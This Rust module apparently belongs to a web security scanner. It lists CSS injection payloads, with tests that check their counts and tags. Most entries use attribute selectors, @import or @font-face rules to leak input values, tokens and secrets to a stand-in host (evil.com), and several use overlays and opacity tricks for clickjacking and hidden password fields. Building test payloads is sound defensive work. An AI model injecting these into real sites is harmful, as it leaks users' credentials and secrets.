use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::CssInject,
        "exfiltration", [
            (r#"input[value^="a"] { background: url(http://evil.com/?a) }"#, "Prefix character exfiltration via background", Severity::High),
            (r#"input[name="token"][value^="a"] + div { background: url(http://evil.com/?leak=a) }"#, "Token exfiltration via sibling selector", Severity::Critical),
            (r#"input[value^="a"] { list-style-image: url(http://evil.com/?p=a) }"#, "Prefix character exfiltration via list-style-image", Severity::High),
            (r#"input[value^="a"] { border-image: url(http://evil.com/?b=a) slice }"#, "Prefix character exfiltration via border-image", Severity::High),
            (r#"div:has(input[value="1337"]) { background: url(http://evil.com/?val=1337) }"#, "Has-selector value exfiltration", Severity::Critical),
            (r#"input[value$="a"] { background: url(http://evil.com/?suffix=a) }"#, "Suffix selector exfiltration", Severity::High),
            (r#"input[value*="a"] { background: url(http://evil.com/?contains=a) }"#, "Contains selector exfiltration", Severity::High),
            (r#"input[value="1234"] { background: url(http://evil.com/?exact=1234) }"#, "Exact match exfiltration", Severity::Critical),
        ];
        "import", [
            (r#"@import url(http://evil.com/staging?len=32);"#, "External stylesheet import for data exfiltration", Severity::High),
            (r#"@import'//evil.com';"#, "Shorthand protocol-relative import", Severity::High),
            (r#"@import url("http://evil.com/payload.css?data=secret");"#, "Data import via external stylesheet", Severity::Critical),
            (r#"@import 'http://evil.com/chained.css';"#, "Chained import for style injection", Severity::High),
        ];
        "font-face", [
            (r#"@font-face{font-family:poc;src:url(http://evil.com/?A);unicode-range:U+0041;}"#, "Font-face character A detection for exfiltration", Severity::Critical),
            (r#"@font-face{font-family:poc;src:url(http://evil.com/?B);unicode-range:U+0042;}"#, "Font-face character B detection for exfiltration", Severity::Critical),
            (r#"@font-face{font-family:poc;src:url(http://evil.com/?0);unicode-range:U+0030;}"#, "Font-face digit 0 detection for exfiltration", Severity::Critical),
            (r#"#secret{font-family:poc;}"#, "Target element for font-based detection", Severity::High),
        ];
        "selector", [
            (r#"[data-secret] { background: url(http://evil.com/?has_attr) }"#, "Attribute presence selector exfiltration", Severity::High),
            (r#"[data-secret^="abc"] { background: url(http://evil.com/?prefix=abc) }"#, "Attribute prefix selector exfiltration", Severity::High),
            (r#"[data-secret$="xyz"] { background: url(http://evil.com/?suffix=xyz) }"#, "Attribute suffix selector exfiltration", Severity::High),
            (r#"[data-secret*="key"] { background: url(http://evil.com/?contains=key) }"#, "Attribute contains selector exfiltration", Severity::High),
            (r#"[data-secret~="word"] { background: url(http://evil.com/?word=word) }"#, "Attribute word match selector exfiltration", Severity::High),
        ];
        "ui-redress", [
            ("body { opacity: 0.01; }", "Nearly invisible page for UI redress", Severity::High),
            (r#"div { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; }"#, "Full-page overlay for UI redress", Severity::High),
            (r#"a { position: relative; z-index: -1; }"#, "Link hidden behind overlay for clickjacking", Severity::Medium),
            (r#"input[type="password"] { opacity: 0; }"#, "Hidden password field for credential theft", Severity::Critical),
        ]
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "Must have at least one payload");
    }

    #[test]
    fn all_payloads_are_css_inject_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::CssInject);
        }
    }

    #[test]
    fn contains_exfiltration_payloads() {
        let payloads = get_payloads();
        let exfil: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"exfiltration".to_string()))
            .collect();
        assert!(
            exfil.len() >= 4,
            "Must have at least 4 exfiltration payloads, got {}",
            exfil.len()
        );
    }

    #[test]
    fn contains_import_payloads() {
        let payloads = get_payloads();
        let imports: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"import".to_string()))
            .collect();
        assert!(
            imports.len() >= 2,
            "Must have at least 2 import payloads, got {}",
            imports.len()
        );
    }

    #[test]
    fn contains_font_face_payloads() {
        let payloads = get_payloads();
        let font: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"font-face".to_string()))
            .collect();
        assert!(
            font.len() >= 2,
            "Must have at least 2 font-face payloads, got {}",
            font.len()
        );
    }

    #[test]
    fn contains_selector_payloads() {
        let payloads = get_payloads();
        let sel: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"selector".to_string()))
            .collect();
        assert!(
            sel.len() >= 3,
            "Must have at least 3 selector payloads, got {}",
            sel.len()
        );
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 15,
            "Must have at least 15 CSS injection payloads, got {}",
            payloads.len()
        );
    }
}
